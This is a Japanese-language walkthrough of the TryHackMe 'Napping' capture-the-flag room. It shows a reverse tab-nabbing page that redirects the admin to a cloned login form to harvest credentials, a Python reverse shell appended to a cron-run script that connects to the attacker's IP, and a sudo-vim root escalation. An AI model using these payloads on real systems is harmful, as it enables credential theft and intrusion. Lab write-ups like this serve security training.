# Napping CTF

https://tryhackme.com/room/nappingis1337

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.225.76
root@ip-10-10-213-148:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-11 00:58 BST
Nmap scan report for 10.10.225.76
Host is up (0.00021s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:2B:74:C3:CF:C9 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 4.54 seconds
root@ip-10-10-213-148:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-11 00:58 BST
Nmap scan report for 10.10.225.76
Host is up (0.00011s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 02:2B:74:C3:CF:C9 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, HTTP

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://napping.thm -w ./dirlist.txt -t 30 -k

/admin                (Status: 301) [Size: 310] [--> http://napping.thm/admin/]
/config.php           (Status: 200) [Size: 1]
/index.php            (Status: 200) [Size: 1211]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/register.php         (Status: 200) [Size: 1567]
/reset-password.php   (Status: 302) [Size: 0] [--> index.php]
/welcome.php          (Status: 302) [Size: 0] [--> index.php]
```

- config.php に隠しパラメータが無いか探したが、見つからなかった。

```shell
$ ffuf -u http://napping.thm/config.php?FUZZ=a -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=djf3tgqkcukhmvfg967m1k9b24' -fs 1
```

- welcome.php 画面に、ブログのURLを送信するフォームがある。

```
All links will be reviewed by our admin who also built this site!
```

自分のマシンのIPを入力したらリクエストが来るが・・・  
admin の Cookie をこちらのマシンに送信させられるか考えたが、無理と思われる。  
また、reset-password.php を実行させられないか考えたが、POSTが必要なので無理と思われる。

## Reverse Tab Nabbing

https://book.hacktricks.wiki/en/pentesting-web/reverse-tab-nabbing.html

URL入力後、下記リンクが生成されていることが分かる。  
target="_blank" が指定されており、かつ rel="noopener" または rel="noreferrer" が指定されていないため、Reverse Tab Nabbing 攻撃が成立する可能性がある。

```html
<a href='http://10.2.22.182:8000/index.html' target='_blank' >Here</a>
```

1. 現在のタブを開いた元のタブのLocationを（2で作成するページに）変更するHTMLページを用意する
2. 攻撃対象サイトのログイン画面に似せたログインページを用意する
3. adminがだまされてログイン情報を入力したら、その情報が攻撃者に送信される

### アクセスさせるページ blog.html

```html
<!DOCTYPE html>
<html>
 <body>
  Welcome to my blog!
  <script>
  window.opener.location = "http://10.2.22.182:8000/index.php";
  </script>
 </body>
</html>
```

### ログインページ index.php

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Login</h2>
        <p>Please fill in your credentials to login.</p>


        <form action="/index.php" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control " value="">
                <span class="invalid-feedback"></span>
            </div>    
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control ">
                <span class="invalid-feedback"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
        </form>
    </div>
</body>
</html>
```

上記で実行したが、blog.html と index.php のGETリクエストは来たものの、POSTリクエストが来なかった。

ここは、index.php ではなく、/admin/login.php を模倣しなければならなかった。

```shell
root@ip-10-10-122-160:~# gobuster dir -x=txt,php -u http://10.10.108.81/admin -w ./dirlist.txt -t 30 -k

===============================================================
/config.php           (Status: 200) [Size: 0]
/login.php            (Status: 200) [Size: 1158]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/welcome.php          (Status: 302) [Size: 0] [--> login.php]
===============================================================
```

### login.php

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Admin Login</h2>
        <p>Please fill in your credentials to login.</p>


        <form action="/admin/login.php" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control " value="">
                <span class="invalid-feedback"></span>
            </div>    
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control ">
                <span class="invalid-feedback"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <br>
        </form>
    </div>
</body>
</html>
```

POSTリクエストが来た！

```shell
$ php -S 10.2.22.182:8000
[Sat May 10 22:55:33 2025] PHP 8.2.21 Development Server (http://10.2.22.182:8000) started
[Sat May 10 22:57:01 2025] 10.10.108.81:33670 Accepted
[Sat May 10 22:57:01 2025] 10.10.108.81:33670 [200]: GET /blog.html
[Sat May 10 22:57:01 2025] 10.10.108.81:33670 Closing
[Sat May 10 22:57:02 2025] 10.10.108.81:33678 Accepted
[Sat May 10 22:57:02 2025] 10.10.108.81:33678 [200]: GET /login.php
[Sat May 10 22:57:02 2025] 10.10.108.81:33678 Closing
[Sat May 10 22:57:02 2025] 10.10.108.81:47934 Accepted
[Sat May 10 22:57:02 2025] 10.10.108.81:47934 [200]: POST /login.php
[Sat May 10 22:57:02 2025] 10.10.108.81:47934 Closing
```

Wiresharkでキャプチャしたリクエスト。

```http
POST /login.php HTTP/1.1
Host: 10.2.22.182:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
PHPSESSID: 1c7tfnwk9xuln3yt3jmja3te7l
Content-Length: 45
Content-Type: application/x-www-form-urlencoded

username=daniel&password=[REDACTED]
```

admin/login.php でログインしても特に何もなかったが、SSHパスワードとして使えた。

## 権限昇格１

user.txt は adrian ユーザーにならなければいけない。

```shell
daniel@ip-10-10-108-81:~$ ls -al /home/adrian
total 44
drwxr-xr-x 4 adrian adrian         4096 May 11 03:00 .
drwxr-xr-x 5 root   root           4096 May 11 02:23 ..
lrwxrwxrwx 1 root   root              9 Mar 16  2022 .bash_history -> /dev/null
-rw-r--r-- 1 adrian adrian          220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 adrian adrian         3771 Feb 25  2020 .bashrc
drwx------ 2 adrian adrian         4096 Mar 15  2022 .cache
lrwxrwxrwx 1 root   root              9 Mar 16  2022 .mysql_history -> /dev/null
-rw-r--r-- 1 adrian adrian          807 Feb 25  2020 .profile
-rw-rw-r-- 1 adrian administrators  480 Mar 16  2022 query.py
-rw-rw-r-- 1 adrian adrian           75 Mar 16  2022 .selected_editor
-rw-rw-r-- 1 adrian adrian           96 May 11 03:02 site_status.txt
drwx------ 2 adrian adrian         4096 Mar 15  2022 .ssh
-rw-r--r-- 1 adrian adrian            0 Mar 15  2022 .sudo_as_admin_successful
-rw-r----- 1 root   adrian           56 Mar 16  2022 user.txt
-rw------- 1 adrian adrian            0 Mar 16  2022 .viminfo
```

query.py

```shell
daniel@ip-10-10-108-81:/home/adrian$ cat ./query.py 
from datetime import datetime
import requests

now = datetime.now()

r = requests.get('http://127.0.0.1/')
if r.status_code == 200:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Site is Up: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
else:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Check Out Site: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
```

site_status.txt

```shell
daniel@ip-10-10-108-81:/home/adrian$ cat ./site_status.txt 
Site is Up: 11/05/2025 03:00:02
Site is Up: 11/05/2025 03:01:01
Site is Up: 11/05/2025 03:02:01
Site is Up: 11/05/2025 03:03:01
Site is Up: 11/05/2025 03:04:02
```

daniel は administrators なので、query.py を編集できる。

```shell
daniel@ip-10-10-108-81:/home/adrian$ id
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel),1002(administrators)
```

query.py の一番下に、下記コードを追加。

```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.2.22.182",8888));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty;
pty.spawn("sh")
```

リバースシェル取得成功。

```shell
$ nc -nvlp 8888   
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.108.81] 56560
$ 
```

ユーザーフラグゲット

```shell
adrian@ip-10-10-108-81:~$ cat ./user.txt 
THM{.......................................}
```

## 権限昇格２

```shell
adrian@ip-10-10-108-81:~$ sudo -l
Matching Defaults entries for adrian on ip-10-10-108-81:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adrian may run the following commands on ip-10-10-108-81:
    (root) NOPASSWD: /usr/bin/vim
```

vim に sudo が付いている。これは楽勝。

```shell
adrian@ip-10-10-108-81:~$ sudo vim -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) groups=0(root)
```

```shell
# cat /root/root.txt
THM{.................................}
```

## 振り返り

- Reverse Tab Nabbing は初見。勉強になる。
- ディレクトリサーチで見つかったディレクトリは、アクセス可能だろうがなんだろうが必ず機械的にディレクトリサーチをかけること。
